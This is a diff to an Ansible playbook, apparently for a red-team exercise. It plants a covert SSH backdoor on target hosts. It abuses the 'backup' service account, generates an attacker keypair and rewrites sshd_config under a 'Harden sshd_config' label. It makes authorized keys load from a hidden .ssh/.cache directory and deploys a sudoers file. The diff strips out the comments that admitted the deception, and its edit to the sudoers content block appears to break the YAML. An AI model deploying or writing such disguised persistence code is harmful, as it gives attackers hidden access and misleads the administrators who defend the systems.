@@ -7,13 +7,33 @@
 
   vars:
     ssh_backdoor_user: "backup"        # abuse an existing service account
-    attacker_pub_key: "ssh-rsa AAAA... your_public_key_here"
+    ssh_key_path: "~/.ssh/redteam_key"
 
+  pre_tasks:
+
+    - name: Generate redteam SSH keypair locally if it doesn't exist
+      openssh_keypair:
+        path: "{{ ssh_key_path }}"
+        type: rsa
+        size: 4096
+        state: present
+        force: no             # won't overwrite if it already exists
+      delegate_to: localhost
+      become: no              # generate as your local user, not root
+      run_once: true          # only needs to happen once, not per target
+
+    - name: Read the generated public key
+      set_fact:
+        attacker_pub_key: "{{ lookup('file', ssh_key_path + '.pub') }}"
+      delegate_to: localhost
+      become: no
+      run_once: true
+  
   tasks:
 
     # --- SSH MISCONFIGURATION ---
 
-    - name: Harden sshd_config (looks defensive, actually opens backdoors)
+    - name: Harden sshd_config
       lineinfile:
         path: /etc/ssh/sshd_config
         regexp: "{{ item.regexp }}"
@@ -25,7 +45,7 @@
         - { regexp: '^#?DebianBanner', line: 'DebianBanner no' }
         - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 6' }
 
-    # The sneaky part — blue team sees what looks like
+    # Blue team sees what looks like
     # a locked down sshd_config, but AuthorizedKeysFile
     # now also reads from .ssh/.cache which they won't notice
 
@@ -57,7 +77,7 @@
         owner: root
         group: root
         validate: /usr/sbin/visudo -cf %s            # won't deploy if syntax is wrong
-        content: |
+        content:
           # Default system hardening overrides
           Defaults        env_reset
           Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
